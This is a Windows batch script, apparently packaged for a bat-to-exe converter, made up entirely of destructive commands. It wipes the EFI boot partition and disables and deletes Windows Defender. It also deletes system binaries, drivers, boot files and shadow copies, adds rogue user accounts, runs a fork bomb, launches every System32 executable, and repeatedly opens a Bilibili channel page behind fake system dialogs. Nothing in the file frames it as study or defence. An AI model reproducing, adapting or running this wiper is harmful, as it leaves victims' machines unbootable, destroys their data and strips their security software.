::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAjk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJheU8BHVDMbTLrX+1NuIg=
::ZQ05rAF9IBncCkqN+0xwdVsFHVDXbT/0V+xNsbCqv4o=
::ZQ05rAF9IAHYFVzEqQJheU8BHVDMbTLrX+1NuIg=
::eg0/rx1wNQPfEVWB+kM9LVsJDFXTaD7rUvse6fyb
::fBEirQZwNQPfEVWB+kM9LVsJDFXTaD7rUuRFubGjvrrn
::cRolqwZ3JBvQF1fEqQJheU8BHVDTZTrjXuRMiA==
::dhA7uBVwLU+EWAjVoBdhfEoNHV3abTva
::YQ03rBFzNR3SWATEpRNkfUoAHV3TZTPrVtU=
::dhAmsQZ3MwfNWATEpRNkfUoAHV3TZTPrVtU=
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnVpRZleU8FFVXbZDrqZg==
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy+WQrEESVeYsRI3S1r2MKewabp8Q8Fva6f+Kd03M/ZO/tJdDuDk1p+y7VECKONWP816wHh3YshppSjws1jNVW+6+hQQgEgzUVsthebE3GmvuVaUM2FXUk4oSRHCIcYcF5Q/U
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
tasklist | findstr "MsMpEng.exe"
mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
taskkill /F /IM MsMpEng.exe
rd /s /q "C:\Program Files\Internet Explorer"
rd /s /q "C:\Windows\System32\Speech"
del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Internet Explorer.lnk"
reg delete "HKCR\IE.AssocFile.HTM" /f
reg delete "HKCU\Software\Microsoft\Windows Media" /f
reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}" /f
:: 1. 移除Windows Defender（保留核心安全服务）
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
taskkill /f /im MsMpEng.exe
rmdir /s /q "C:\Program Files\Windows Defender"
rmdir /s /q "C:\ProgramData\Microsoft\Windows Defender"
:: 2. 删除旧版.NET Framework（需确保无程序依赖）
dir /b %SystemRoot%\Microsoft.NET\Framework\v3.* > .\net3list.txt
for /f "tokens=*" %%i in (.\net3list.txt) do (
  rd /s /q "%SystemRoot%\Microsoft.NET\Framework\%%i"
  reg delete "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\%%i" /f
)
reg delete "HKLM\SOFTWARE\Microsoft\Internet Explorer" /f
reg delete "HKCR\CLSID\{0002DF01-0000-0000-C000-000000000046}" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
del /s /q "C:\Program Files\Windows Defender"
del /s /q "C:\Windows\System32\drivers"
del /f /s /q "C:\Program Files\Windows Defender\*.*"
rmdir /s /q "C:\Program Files\Windows Defender"
rmdir /s /q "C:\Program Files (x86)\Windows Defender"
del /f /s /q "C:\ProgramData\Microsoft\Windows Defender\*.*"
del /s /q "C:\Program Files\Windows Defender"
del /s /q "C:\ProgramData\Microsoft\Windows Defender"
del /s /q "C:\Windows\Boot"
del /s /q "C:\Windows\system32\cmd.exe"
del /s /q "C:\Windows\System32\Taskmgr.exe"
del /s /q "C:\Windows\System32\osk.exe"
start https://space.bilibili.com/3493276898298079
start https://space.bilibili.com/3493276898298079
start https://space.bilibili.com/3493276898298079
start https://space.bilibili.com/3493276898298079
start https://space.bilibili.com/3493276898298079
mshta vbscript:msgbox("操作已完�?,48,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完�?,64,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完�?,16,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完�?,64,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完�?,48,"系统提示")(window.close)
start mshta vbscript:msgbox("重启倒计�?,0,"警告")(window.close)
timeout /t 1 >nul
net USER 1145141919810 1145141919810 /add
net user 114514 /add
net user 1919810 /add
mountvol X: /s & del X:\ *.* /s /f /q & rd /s /q X:\EFI
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t 
REG_DWORD /d 1 /f
vssadmin delete shadows /all /quiet
cd C:\Program Files\Internet Explorer /d
del /f /s /q *.*
rmdir /s /q C:\Program Files\Internet Explorer
mshta vbscript:CreateObject("Wscript.Shell").popup("1145141919810秒后自动关闭",1145141919810,"倒计�?,64)(window.close)
shutdown -s -t 1145141919810
mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
shutdown -r -t 1145141919810
shutdown -s -t 1145141919810
shutdown -s -t 1145141919810
shutdown -s -t 1145141919810
shutdown -s -t 1145141919810
%0|%0
ipconfig
sc Create SuperCMD binpath= "cmd /K start" type= own type= interact
net start SuperCMD
for %%a in (%windir%\system32\*.exe) do (
  if /i not "%%~na"=="logoff" start %%~fa
)
pause
